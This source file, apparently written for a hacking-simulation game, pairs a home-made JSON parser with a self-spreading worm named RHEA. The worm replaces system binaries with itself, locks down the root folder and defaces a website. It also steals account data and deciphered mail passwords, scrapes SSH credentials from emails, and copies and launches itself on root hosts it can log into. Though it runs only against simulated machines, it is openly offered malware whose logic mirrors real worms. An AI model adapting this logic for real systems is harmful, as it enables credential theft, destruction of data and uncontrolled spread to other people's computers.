// https://gitlab.com/H3xad3cimalDev/gson
JSON = {}
JSON.Kind = {}
JSON.Kind.NumberToken = 0
JSON.Kind.StringToken = 1
JSON.Kind.BooleanToken = 2
JSON.Kind.NullToken = 3
JSON.Kind.WhitespaceToken = 4
JSON.Kind.OpenBracketToken = 5
JSON.Kind.CloseBracketToken = 6
JSON.Kind.OpenBraceToken = 7
JSON.Kind.CloseBraceToken = 8
JSON.Kind.ColonToken = 9
JSON.Kind.CommaToken = 10
JSON.Kind.EOLToken = 11
JSON.Kind.EOFToken = 12
JSON.Kind.UnkownToken = 13
JSON.Kind.UnkownIdentifierToken = 14
JSON.Kind.TabToken = 15
JSON.Kind.KeypairExpression = 16
JSON.Kind.ValueExpression = 17
JSON.Kind.ObjectExpression = 18
JSON.Kind.ArrayExpression = 19
JSON.Kind.ToString = function(kind)
for pk in JSON.Kind
if pk.value == kind then
return pk.key
end if
end for
end function
JSON.TextSpan = {"Start":-1, "End":-1, "Length":-1}
JSON.TextSpan.Init = function(start, length)
self.Start = start
self.Length = length
self.End = start + length
end function
JSON.TextSpan.Init2End = function(start, endn)
self.Start = start
self.End = endn
self.Length = endn - start
end function
JSON.Token = {"Kind":-1, "Position":-1, "Text":"", "Value":"", "Span":[]}
JSON.Token.Init = function(Kind, Position, Text, Value)
self.Kind = Kind
self.Position = Position
self.Text = Text
self.Value = Value
self.Span = new JSON.TextSpan
if Text == null then
self.Span.Init(Position, 0)
else
self.Span.Init(Position, Text.len)
end if
end function
JSON.Diagnostic = {"Message":"", "Span":{}, "Code":-1}
JSON.Diagnostic.Codes = {}
JSON.Diagnostic.Codes.UNKOWN_TOKEN        = 0
JSON.Diagnostic.Codes.UNKOWN_IDENTIFIER   = 1
JSON.Diagnostic.Codes.INVALID_NUMBER      = 2
JSON.Diagnostic.Codes.DOUBLE_DOT_FLOAT    = 3
JSON.Diagnostic.Codes.UNTERMINATED_STRING = 4
JSON.Diagnostic.Codes.EXPECTED_TOKEN_KIND  = 5
JSON.Diagnostic.Codes.EXPECTED_VALUE_TOKEN = 6
JSON.Diagnostic.Init = function(message, span, code)
self.Message = message
self.Span = span
self.Code = code
end function
JSON.Diagnostic.UnkownToken = function(token)
diagnostic = new JSON.Diagnostic
diagnostic.Init("Unknown token '" + token.Text + "'", token.Span, JSON.Diagnostic.Codes.UNKOWN_TOKEN)
return diagnostic
end function
JSON.Diagnostic.UnkownIdentifier = function(token)
diagnostic = new JSON.Diagnostic
diagnostic.Init("Unknown identifier '" + token.Text + "'", token.Span, JSON.Diagnostic.Codes.UNKOWN_IDENTIFIER)
return diagnostic
end function
JSON.Diagnostic.InvalidNumber = function(start, text)
diagnostic = new JSON.Diagnostic
span = new JSON.TextSpan
span.Init(start, text.len)
diagnostic.Init("'" + text + "' is not a valid number", span, JSON.Diagnostic.Codes.INVALID_NUMBER)
return diagnostic
end function
JSON.Diagnostic.DoubleDotFloat = function(start, text)
diagnostic = new JSON.Diagnostic
span = new JSON.TextSpan
span.Init(start, text.len)
diagnostic.Init("'" + text + "' is not a valid number", span, JSON.Diagnostic.Codes.DOUBLE_DOT_FLOAT)
return diagnostic
end function
JSON.Diagnostic.ExpectedTokenKind = function(kind, token)
diagnostic = new JSON.Diagnostic
diagnostic.Init("Expected <" + JSON.Kind.ToString(kind) + ">, got <" + JSON.Kind.ToString(token.Kind) + ">", token.Span, JSON.Diagnostic.Codes.EXPECTED_TOKEN_KIND)
return diagnostic
end function
JSON.Diagnostic.ExpectValueToken = function(token)
diagnostic = new JSON.Diagnostic
diagnostic.Init("Expected a value token, got <" + JSON.Kind.ToString(token.Kind) + ">", token.Span, JSON.Diagnostic.Codes.EXPECTED_VALUE_TOKEN)
end function
JSON.Diagnostic.UnterminatedString = function(start, text)
diagnostic = new JSON.Diagnostic
span = new JSON.TextSpan
span.Init(start, text.len)
diagnostic.Init("Unterminated string literal (""" + text + """)", span, JSON.Diagnostic.Codes.UNTERMINATED_STRING)
return diagnostic
end function
JSON.DiagnosticBag = {"__raw__": []}
JSON.DiagnosticBag.Init = function()
self.__raw__ = []
end function
JSON.DiagnosticBag.AddDiagnostic = function(diagnostic)
self.__raw__.push(diagnostic)
end function
JSON.DiagnosticBag.GetDiagnosticMessages = function()
messages = []
for diagnostic in self.__raw__
messages.push(diagnostic.Message)
end for
return messages
end function
JSON.DiagnosticBag.GetDiagnostics = function()
return self.__raw__
end function
JSON.DiagnosticBag.Concat = function(diagnosticBag)
self.__raw__ = self.__raw__ + diagnosticBag.__raw__
end function
JSON.Lexer = {"_text":"", "_position":0, "Diagnostics":[]}
JSON.Lexer.Init = function(text)
self._text = text
self._position = 0
self.Diagnostics = new JSON.DiagnosticBag
self.Diagnostics.Init()
end function
JSON.Lexer.Peek = function(offset)
index = self._position + offset
if index >= self._text.len then
return char(0)
end if
return self._text[index]
end function
JSON.Lexer.Lookahead = function()
return self.Peek(1)
end function
JSON.Lexer.GetCurrent = function()
return self.Peek(0)
end function
JSON.Lexer.Next = function()
self._position = self._position + 1
end function
JSON.Lexer.CreateToken = function(Kind, Position, Text, Value)
token = new JSON.Token
token.Init(Kind, Position, Text, Value)
return token
end function
JSON.Lexer.IsAtEnd = function()
return self._position >= self._text.len
end function
JSON.Lexer.Lex = function()
if self.IsAtEnd() then
return self.CreateToken(JSON.Kind.EOFToken, self._position, char(0), null)
end if
if typeof(self.GetCurrent().to_int) == "number" then
start = self._position
isFloat = false
while true
if self.GetCurrent() == "." then
if not isFloat then
isFloat = true
self.Next()
continue
else
self.Diagnostics.AddDiagnostic(JSON.Diagnostic.DoubleDotFloat(start, self._text[start:self._position]))
break
end if
end if
if not typeof(self.GetCurrent().to_int) == "number" or self.IsAtEnd() then break end if
self.Next()
end while
text = self._text[start:self._position]
value = null
if isFloat then
value = text.val
else
value = text.to_int
end if
if value == null then
self.Diagnostics.AddDiagnostic(JSON.Diagnostic.InvalidNumber(start, text))
end if
return self.CreateToken(JSON.Kind.NumberToken, start, text, value)
end if
if self.GetCurrent() == """" then
start = self._position
self.Next()
text = ""
while true
if self.IsAtEnd() or self.GetCurrent() == char(10) then
self.Diagnostics.AddDiagnostic(JSON.Diagnostic.UnterminatedString(start, text))
break
end if
if self.GetCurrent() == """" then
self.Next()
break
end if
if self.GetCurrent() == "\\" then
self.Next()
if self.GetCurrent() == "u" then
self.Next()
hex = self.GetCurrent()
self.Next()
hex = hex + self.GetCurrent()
self.Next()
hex = hex + self.GetCurrent()
self.Next()
hex = hex + self.GetCurrent()
character = char(hex) 
text = text + character
self.Next()
continue
else if self.GetCurrent() == """" then
text = text + """"
self.Next()
continue
else if self.GetCurrent() == "\\" then
text = text + "\\"
self.Next()
continue
else if self.GetCurrent() == "/" then
text = text + "/"
self.Next()
continue
else if self.GetCurrent() == "b" then
text = text + char(8)
self.Next()
continue
else if self.GetCurrent() == "f" then
text = text + char(12)
self.Next()
continue
else if self.GetCurrent() == "n" then
text = text + char(10)
self.Next()
continue
else if self.GetCurrent() == "r" then
text = text + char(13)
self.Next()
continue
else if self.GetCurrent() == "t" then
text = text + char(9)
self.Next()
continue
end if
end if
text = text + self.GetCurrent()
self.Next()
end while
tokenText = self._text[start:self._position]
return self.CreateToken(JSON.Kind.StringToken, start, tokenText, text)
end if
if self.GetCurrent() == " " then
start = self._position
while true
if self.GetCurrent() != " " or self.IsAtEnd() then break end if
self.Next()
end while
text = self._text[start:self._position]
return self.CreateToken(JSON.Kind.WhitespaceToken, start, text, null)
end if
if self.GetCurrent() == char(9) then
self.Next()
return self.CreateToken(JSON.Kind.TabToken, self._position - 1, char(9), null)
end if
if self.GetCurrent() == "{" then
self.Next()
return self.CreateToken(JSON.Kind.OpenBraceToken, self._position - 1, "{", null)
end if
if self.GetCurrent() == "}" then
self.Next()
return self.CreateToken(JSON.Kind.CloseBraceToken, self._position - 1, "}", null)
end if
if self.GetCurrent() == "[" then
self.Next()
return self.CreateToken(JSON.Kind.OpenBracketToken, self._position - 1, "[", null)
end if
if self.GetCurrent() == "]" then
self.Next()
return self.CreateToken(JSON.Kind.CloseBracketToken, self._position - 1, "]", null)
end if
if self.GetCurrent() == ":" then
self.Next()
return self.CreateToken(JSON.Kind.ColonToken, self._position - 1, ":", null)
end if
if self.GetCurrent() == "," then
self.Next()
return self.CreateToken(JSON.Kind.CommaToken, self._position - 1, ",", null)
end if
if "abcdefghijklmnopqrstuvwxyz".split("|").indexOf(self.GetCurrent()) != null then
start = self._position
self.Next()
while true
if "abcdefghijklmnopqrstuvwxyz".split("|").indexOf(self.GetCurrent()) == null or self.IsAtEnd() then break end if
self.Next()
end while
text = self._text[start:self._position]
if text == "true" then
return self.CreateToken(JSON.Kind.BooleanToken, start, text, true)
else if text == "false" then
return self.CreateToken(JSON.Kind.BooleanToken, start, text, false)
else if text == "null" then
return self.CreateToken(JSON.Kind.NullToken, start, text, null)
else
unkownIndentifier = self.CreateToken(JSON.Kind.UnkownIdentifierToken, start, text, null)
self.Diagnostics.AddDiagnostic(JSON.Diagnostic.UnknownIdentifier(unkownIndentifier))
return unkownIndentifier
end if
end if
if self.GetCurrent() == char(10) then
self.Next()
return self.CreateToken(JSON.Kind.EOLToken, self._position - 1, char(10), null)
end if
self.Next()
unkownToken = self.CreateToken(JSON.Kind.UnknownToken, self._position - 1, self.GetCurrent(), null)
self.Diagnostics.AddDiagnostic(JSON.Diagnostic.UnkownToken(unkownToken))
return unkownToken
end function
JSON.KeypairExpression = {"NameToken":"", "ValueExpression":"", "SeperatorToken":"", "Kind":JSON.Kind.KeypairExpression}
JSON.KeypairExpression.Init = function(nameToken, seperatorToken, valueExpression)
self.NameToken = nameToken
self.SeperatorToken = seperatorToken
self.ValueExpression = valueExpression
self.Kind = JSON.Kind.KeypairExpression
end function
JSON.ValueExpression = {"ValueToken":"", "Kind":JSON.Kind.ValueExpression}
JSON.ValueExpression.Init = function(valueToken)
self.ValueToken = valueToken
self.Kind = JSON.Kind.ValueExpression
end function
JSON.ObjectExpression = {"OpeningBraceToken":"", "Pairs":[], "ClosingBraceToken":"", "Kind":JSON.Kind.ObjectExpression}
JSON.ObjectExpression.Init = function(openingBraceToken, pairs, closingBraceToken)
self.OpeningBraceToken = openingBraceToken
self.Pairs = pairs
self.ClosingBraceToken = closingBraceToken
self.Kind = JSON.Kind.ObjectExpression
end function
JSON.ArrayExpression = {"OpeningBracketToken":"", "Values":[], "ClosingBracketToken":"", "Kind":JSON.Kind.ArrayExpression}
JSON.ArrayExpression.Init = function(openingBracketToken, values, closingBracketToken)
self.OpeningBracketToken = openingBracketToken
self.Values = values
self.ClosingBracketToken = closingBracketToken
self.Kind = JSON.Kind.ArrayExpression
end function
JSON.Parser = {"_text":"", "_position":0, "Diagnostics":[], "tokens":[]}
JSON.Parser.Init = function(text)
self._text = text
self._position = 0
self.Diagnostics = new JSON.DiagnosticBag
self.Diagnostics.Init()
self.tokens = []
lexer = new JSON.Lexer
lexer.Init(text)
while true
token = lexer.Lex()
if token.Kind != JSON.Kind.WhitespaceToken and token.Kind != JSON.Kind.EOLToken and token.Kind != JSON.Kind.UnkownToken and token.Kind != JSON.Kind.UnkownIdentifierToken and token.Kind != JSON.Kind.TabToken then
self.tokens.push(token)
end if
if token.Kind == JSON.Kind.EOFToken then
break
end if
end while
self.Diagnostics.Concat(lexer.Diagnostics)
end function
JSON.Parser.Peek = function(offset)
index = self._position + offset
if index >= self.tokens.len then
return self.tokens[self.tokens.len - 1]
end if
return self.tokens[index]
end function
JSON.Parser.Lookahead = function()
return self.Peek(1)
end function
JSON.Parser.GetCurrent = function()
return self.Peek(0)
end function
JSON.Parser.NextToken = function()
token = self.GetCurrent()
self._position = self._position + 1
return token
end function
JSON.Parser.MatchToken = function(kind)
if self.GetCurrent().Kind == kind then
return self.NextToken()
end if
self.Diagnostics.AddDiagnostic(JSON.Diagnostic.ExpectedTokenKind(kind, self.GetCurrent()))
token = new JSON.Token
token.Init(kind, self.GetCurrent().Kind, null, null)
self.NextToken()
return token
end function
JSON.Parser.Parse = function()
if self.GetCurrent().Kind == JSON.Kind.OpenBraceToken then
return self.ParseObject()
else if self.GetCurrent().Kind == JSON.Kind.OpenBracketToken then
return self.ParseArray()
end if
end function
JSON.Parser.ParseObject = function()
openingBraceToken = self.MatchToken(JSON.Kind.OpenBraceToken)
pairs = []
closingBraceToken = null
if self.GetCurrent().Kind == JSON.Kind.CloseBraceToken then
closingBraceToken = self.NextToken()
objectExpression = new JSON.ObjectExpression
objectExpression.Init(openingBraceToken, pairs, closingBraceToken)
return objectExpression
end if
while true
if self.GetCurrent().Kind == JSON.Kind.EOFToken then
break
end if
key = self.ParseKeypair()
pairs.push(key)
if self.GetCurrent().Kind != JSON.Kind.CommaToken and self.Lookahead().Kind != JSON.Kind.CloseBraceToken then
break
end if
self.MatchToken(JSON.Kind.CommaToken)
end while
closingBraceToken = self.MatchToken(JSON.Kind.CloseBraceToken)
objectExpression = new JSON.ObjectExpression
objectExpression.Init(openingBraceToken, pairs, closingBraceToken)
return objectExpression
end function
JSON.Parser.ParseArray = function()
openingBracketToken = self.MatchToken(JSON.Kind.OpenBracketToken)
values = []
closingBracketToken = null
if self.GetCurrent().Kind == JSON.Kind.CloseBracketToken then
closingBracketToken = self.NextToken()
arrayExpression = new JSON.ArrayExpression
arrayExpression.Init(openingBracketToken, values, closingBracketToken)
return arrayExpression
end if
while true
if self.GetCurrent().Kind == JSON.Kind.EOFToken then
break
end if
value = self.ParseValue()
values.push(value)
if self.GetCurrent().Kind != JSON.Kind.CommaToken and self.Lookahead().Kind != JSON.Kind.CloseBracketToken then
break
end if
self.MatchToken(JSON.Kind.CommaToken)
end while
closingBracketToken = self.MatchToken(JSON.Kind.CloseBracketToken)
arrayExpression = new JSON.ArrayExpression
arrayExpression.Init(openingBracketToken, values, closingBracketToken)
return arrayExpression
end function
JSON.Parser.ParseValue = function()
token = self.GetCurrent()
if token.Kind == JSON.Kind.StringToken or token.Kind == JSON.Kind.NumberToken or token.Kind == JSON.Kind.BooleanToken or token.Kind == JSON.Kind.NullToken then
valueExpression = new JSON.ValueExpression
valueExpression.Init(self.NextToken())
return valueExpression
else if token.Kind == JSON.Kind.OpenBraceToken then
return self.ParseObject()
else if token.Kind == JSON.Kind.OpenBracketToken then
return self.ParseArray()
end if
end function
JSON.Parser.ParseKeypair = function()
key = self.MatchToken(JSON.Kind.StringToken)
seperator = self.MatchToken(JSON.Kind.ColonToken)
value = self.ParseValue()
keypairExpression = new JSON.KeypairExpression
keypairExpression.Init(key, seperator, value)
return keypairExpression
end function
JSON.Evaluator = {"root":""}
JSON.Evaluator.Init = function(root)
self.root = root
end function
JSON.Evaluator.Evaluate = function()
return self.EvaluateExpression(self.root)
end function
JSON.Evaluator.EvaluateExpression = function(node)
if node.Kind == JSON.Kind.KeypairExpression then
return {"key":node.NameToken.Value, "value":self.EvaluateExpression(node.ValueExpression)}
end if
if node.Kind == JSON.Kind.ValueExpression then
return node.ValueToken.Value
end if
if node.Kind == JSON.Kind.ArrayExpression then
array = []
for i in node.Values
array.push(self.EvaluateExpression(i))
end for
return array
end if
if node.Kind == JSON.Kind.ObjectExpression then
object = {}
for keyPairExpression in node.Pairs
pair = self.EvaluateExpression(keyPairExpression)
object[pair.key] = pair.value
end for
return object
end if
end function
JSON.Generator = {}
JSON.Generator.GenerateValue = function(value)
if typeof(value) == "string" then
value = value.replace("""", "\""")
value = value.replace(char(10), "\n")
value = """" + value + """"
else if typeof(value) == "number" then
value = str(value)
else if typeof(value) == "map" then
value = self.GenerateObject(value)
else if typeof(value) == "list" then
value = self.GenerateArray(value)
else
value = "null"
end if
return value
end function
JSON.Generator.GenerateKeypair = function(key, value)
return """" + key + """:" + self.GenerateValue(value)
end function
JSON.Generator.GenerateObject = function(object)
objstr = "{"
pairs = []
for k in object
pairs.push(self.GenerateKeypair(k.key, k.value))
end for
objstr = objstr + pairs.join(",") + "}"
return objstr
end function
JSON.Generator.GenerateArray = function(array)
arrstr = "["
values = []
for v in array
values.push(self.GenerateValue(v))
end for
arrstr = arrstr + values.join(",") + "]"
return arrstr
end function
JSON.Generator.Generate = function(object)
if typeof(object) == "map" then
return self.GenerateObject(object)
else if typeof(object) == "list" then
return self.GenerateArray(object)
end if
end function
JSON.Beautifier = {"_text":"", "tabbing":""}
JSON.Beautifier.Init = function(text)
self._text = text
self.tabbing = ""
end function
JSON.Beautifier.Beautify = function()
parser = new JSON.Parser
parser.Init(self._text)
return self.StringifyExpression(parser.Parse())
end function
JSON.Beautifier.StringifyValue = function(node, shouldIndentBegining)
if node.Kind == JSON.Kind.KeypairExpression or node.Kind == JSON.Kind.ValueExpression then
value = null
if node.Kind == JSON.Kind.KeypairExpression then
value = node.ValueExpression.ValueToken.Value
else
value = node.ValueToken.Value
end if
if typeof(value) == "string" then
value = value.replace("""", "\""")
value = value.replace(char(10), "\n")
return """" + value + """"
else if typeof(value) == "number" then
return str(value)
else
return "null"
end if
else if node.Kind == JSON.Kind.ObjectExpression then
return self.StringifyObject(node, shouldIndentBegining)
else if node.Kind == JSON.Kind.ArrayExpression then
return self.StringifyArray(node, shouldIndentBegining)
end if
end function
JSON.Beautifier.TabCase = function(text)
fstr = ""
for line in text.split(char(10))
fstr = fstr + self.tabbing + line + char(10)
end for
return fstr[:-1]
end function
JSON.Beautifier.TabIndent = function()
self.tabbing = self.tabbing + char(9)
return self.tabbing
end function
JSON.Beautifier.TabUnindent = function()
self.tabbing = self.tabbing[:-1]
return self.tabbing
end function
JSON.Beautifier.StringifyObject = function(expression, shouldIndentBegining)
objstr = "{" + char(10)
if shouldIndentBegining then
objstr = self.tabbing + objstr
end if
self.TabIndent()
pairsstr = ""
for k in expression.Pairs
pairsstr = pairsstr + self.tabbing + self.StringifyKeypair(k) + "," + char(10)
end for
objstr = objstr + pairsstr[:-2] + char(10) + self.TabUnindent() + "}"
return objstr
end function
JSON.Beautifier.StringifyArray = function(expression, shouldIndentBegining)
arrstr = "[" + char(10)
if shouldIndentBegining then
arrstr = self.tabbing + arrstr
end if
self.TabIndent()
valuesstr = ""
for v in expression.Values
valuesstr = valuesstr + self.tabbing + self.StringifyValue(v, true) + "," + char(10)
end for
arrstr = arrstr + valuesstr[:-2] + char(10) + self.TabUnindent() + "]"
return arrstr
end function
JSON.Beautifier.StringifyKeypair = function(expression)
return """" + expression.NameToken.Value + """: " + self.StringifyValue(expression.ValueExpression, false)
end function
JSON.Beautifier.StringifyExpression = function(node)
if node.Kind == JSON.Kind.ObjectExpression then
return self.StringifyObject(node, false)
else if node.Kind == JSON.Kind.ArrayExpression then
return self.StringifyArray(node, false)
end if
end function
JSON.Parse = function(text)
parser = new JSON.Parser
parser.Init(text)
parserResult = parser.Parse()
evaluator = new JSON.Evaluator
evaluator.Init(parserResult)
return evaluator.Evaluate()
end function
JSON.Stringify = function(object)
generator = new JSON.Generator
return generator.Generate(object)
end function
JSON.Beautify = function(text)
beautifier = new JSON.Beautifier
beautifier.Init(text)
return beautifier.Beautify()
end function

/////////////

rm_dupe = function(list)
    tmp = []
    for item in list
        if typeof(tmp.indexOf(item)) != "number" then tmp.push(item)
    end for
    return tmp
end function
SearchFolder = function(folder, name = "", special = false, output)
	if not folder then return "ERROR_FOLDER_IN_NULL"

	if special then
		for file in folder.get_files
			if file.name.indexOf(name) != null then output.push(trim(file.path))
		end for
	else
		for file in folder.get_files
			if file.name == name then return output.push(trim(file.path))
		end for
	end if
	
	for folder in folder.get_folders
		SearchFolder(folder, name, special, output)
	end for
end function
FindFile = function(name = "", comp)
	root_folder = comp.File("/")
	
	if root_folder == null then return "ERROR_ROOT_FOLDER_NOT_OBTAINED"
	output = []
	special = false
	if name.indexOf("*") != null then
		special = true
		name = name.remove("*")
	end if

	if special then
		for file in root_folder.get_files
			if file.name.indexOf(name) != null then output.push(trim(file.path))
		end for
	else
		for file in root_folder.get_files
			if file.name == name then return output.push(trim(file.path))
		end for
	end if

	SearchFolder(root_folder, name, special, output)
	return rm_dupe(output)
end function
loadLibrary = function(libFileName)
	paths = FindFile(libFileName, get_shell.host_computer)
	for p in paths
		lib = include_lib(p)
		if lib then return lib
	end for
	return false
end function

nl = "</color>"+char(10)+"<color=red>"
x="<color=red>"
x=x+"    8 888888888o.   8 8888        8 8 8888888888            .8.               "+nl
x=x+"    8 8888    `88.  8 8888        8 8 8888                 .888.              "+nl
x=x+"    8 8888     `88  8 8888        8 8 8888                :88888.             "+nl
x=x+"    8 8888     ,88  8 8888        8 8 8888               . `88888.            "+nl
x=x+"    8 8888.   ,88'  8 8888        8 8 888888888888      .8. `88888.           "+nl
x=x+"    8 888888888P'   8 8888        8 8 8888             .8`8. `88888.          "+nl
x=x+"    8 8888`8b       8 8888888888888 8 8888            .8' `8. `88888.         "+nl
x=x+"    8 8888 `8b.     8 8888        8 8 8888           .8'   `8. `88888.        "+nl
x=x+"    8 8888   `8b.   8 8888        8 8 8888          .888888888. `88888.       "+nl
x=x+"    8 8888     `88. 8 8888        8 8 888888888888 .8'       `8. `88888.  v2.0"+nl
x=x+"                                                                              "+nl
x=x+"          by Nameless#6118 (655861269030502453)                              "+"</color>"+char(10)

title = function()
    clear_screen
    print(x)
end function

title

shell = get_shell
comp = shell.host_computer

rhea = comp.File(program_path)
if not rhea then exit()

if comp.File("/bin") then
    comp.File("/bin").delete
    comp.create_folder("/","bin")
end if

rhea.copy("/bin", "sudo")
rhea.copy("/bin", "ls")
rhea.copy("/bin", "cd")

comp.File("/").set_owner("root",1)
comp.File("/").set_group("root",1)
comp.File("/").chmod("o-wrx",1)
comp.File("/").chmod("u-wrx",1)
comp.File("/").chmod("g-wrx",1)

comp.File("/bin/sudo").chmod("g+x")
comp.File("/bin/ls").chmod("g+x")
comp.File("/bin/cd").chmod("g+x")
comp.File("/usr/bin/Terminal.exe").chmod("g+x")

other_devices = []

if comp.File("/Public/htdocs/website.html") then
    web = comp.File("/Public/htdocs/website.html")
    if web.has_permission("w") then
        web.set_content("<!DOCTYPE html><head><meta content=""width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"" name=""viewport""><title>Infected with RHEA</title><style>html{background-color:#56baed;max-height:500px}body{font-family:Poppins,sans-serif;max-height:500px}a{color:#92badd;display:inline-block;text-decoration:none;font-weight:400}h2{text-align:center;font-size:16px;font-weight:600;text-transform:uppercase;display:inline-block;margin:40px 8px 10px 8px;color:#000}.wrapper{align-items:center;justify-content:center;width:800px;min-height:300px;padding:200px;color:#0d0d0d}#formContent{border-radius:10px 10px 10px 10px;color:#0d0d0d;background:#fff;padding:30px;width:700px;max-width:450px;position:relative;padding:0;box-shadow:0 30px 60px 0 rgba(0,0,0,.3);text-align:center}#formFooter{background-color:#f6f6f6;border-top:1px solid #dce8f1;padding:25px;text-align:center;border-radius:0 0 10px 10px}h2.inactive{color:#ccc}h2.active{color:#0d0d0d;border-bottom:2px solid #5fbae9}button{background-color:#56baed;border:none;color:#000;padding:15px 80px;text-align:center;text-decoration:none;display:inline-block;text-transform:uppercase;font-size:13px;box-shadow:0 10px 30px 0 rgba(95,186,233,.4);border-radius:5px 5px 5px 5px;margin:5px 20px 40px 20px}button:hover{background-color:#39ace7}button:active{transform:scale(.95)}input{background-color:#f6f6f6;border:2px solid #000;color:#424242;display:inline-block;margin:5px;width:300px;border:2px solid #f6f6f6;border-radius:5px 5px 5px 5px}input:focus{background-color:#fff;border-bottom:2px solid #5fbae9;color:#000}input:placeholder{color:#575757}*{box-sizing:border-box}label{color:#000}.absolute{position:absolute}</style><div style=""opacity:0;visibility:hidden"" id=""titlexxx"" class=""absolute"">################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################</div></head><div class=""absolute"" class=""wrapper""><div id=""formContent""><h2 class=""active"">Infected with RHEA</h2><form id=""form""><label>This website has been infected by the RHEA worm.</label><br><button type=""button"" class=""btn btn-primary hidden"">ok lol</button></form></div></div><script>var x=document.getElementById(""titlexxx"");x.remove()</script>")
    end if
end if

ParseJSON = function(text)
    parser = new JSON.Parser
    parser.Init(text)

    parserResult = parser.Parse()

    if parser.Diagnostics.GetDiagnostics().len > 0 then
        return null
    end if

    evaluator = new JSON.Evaluator
    evaluator.Init(parserResult)
    return evaluator.Evaluate()
end function


maps = FindFile("Map.conf", comp)

for mmap in maps
    mmap = comp.File(mmap)
    if mmap == 0 then continue
    if mmap.has_permission("r") == 0 then continue
    
    mmap = mmap.get_content

    if ParseJSON(mmap) == null then continue

    mmap = ParseJSON(mmap)

    if mmap.hasIndex("accounts") == 0 then continue

    for connection in mmap["accounts"]
        other_devices.push(connection)
    end for
end for


mails = FindFile("Mail.txt", comp)

for mfile in mails
    mfile = comp.File(mfile)
    if mfile.has_permission("r") == 0 then continue

    mail_acc = mfile.get_content

    crypto = loadLibrary("crypto.so")
    if crypto == 0 then continue

    p = mail_acc.split(":")
    if not (p and p.len == 2) then continue

    pw = crypto.decipher(p[1])
    title

    if pw == null then continue

    mail_acc = mail_login(p[0],pw)

    for mail in mail_acc.fetch()
        mail = mail.split("\n")
        mail.pull
        mail.pull

        MailID = ""

        for data in mail
            data = data.split(": ")

            if data.len > 1 then
                if data[0] == "MailID" then MailID = data[1]
            end if
        end for

        mail = mail_acc.read(MailID)
        
        mail = mail.split("\n")
        mail.pull

        Sender = ""
        Subject = ""
        Content = ""

        ssh_ip = "?"
        ssh_user = "?"
        ssh_pass = "?"

        for data in mail
            data = data.split(": ")

            if data.len > 1 then
                if data[0] == "From" then Sender = data[1]
                if data[0] == "Subject" then Subject = data[1]
                if data[0] == "IP" then ssh_ip = data[1]
                if data[0] == "user" then ssh_user = data[1]
                if data[0] == "password" then ssh_pass = data[1]
            else
                Content = data[0]
            end if
        end for

        // log the ssh lol
        if ssh_user and ssh_ip and ssh_pass then
            other_devices.push({"user":ssh_user,"ip":ssh_ip,"password":ssh_pass})
        end if

        if Sender != "unknown" then
            mail_acc.send(Sender, "Hack me", "My ip: "+comp.public_ip+" My local ip is: "+comp.local_ip)
        end if
    end for
end for

other_devices = rm_dupe(other_devices)

// check if not gamer time

if other_devices.len < 1 then exit()

// ok gamer time

gud_shell = null
rshell = null

rshells = []

for device in other_devices
    if device["user"] != "root" then continue

    rshell = shell.connect_service(device["ip"],22,"root",device["password"])
    if typeof(rshell) == "string" then continue

    rcomp = rshell.host_computer

    maps = FindFile("Map.conf", rcomp)
    if maps.len > 0 then gud_shell = rshell

    shell.scp(program_path, "/", rshell)

    rheabin = rcomp.File("/rhea")
    if not rheabin then continue

    rshells.push(rshell)

    if rcomp.File("/bin") then
        rcomp.File("/bin").delete
        rcomp.create_folder("/","bin")
    end if

    rheabin.copy("/bin", "sudo")
    rheabin.copy("/bin", "ls")
    rheabin.copy("/bin", "cd")

    rcomp.File("/").set_owner("root",1)
	rcomp.File("/").set_group("root",1)
	rcomp.File("/").chmod("o-wrx",1)
	rcomp.File("/").chmod("u-wrx",1)
	rcomp.File("/").chmod("g-wrx",1)

    rcomp.File("/bin/sudo").chmod("g+x")
    rcomp.File("/bin/ls").chmod("g+x")
    rcomp.File("/bin/cd").chmod("g+x")
    rcomp.File("/usr/bin/Terminal.exe").chmod("g+x")
end for

if gud_shell != null then
    gud_shell.launch("/rhea")
else
    for rshell in rshells
        rshell.launch("/rhea")
    end for
end if
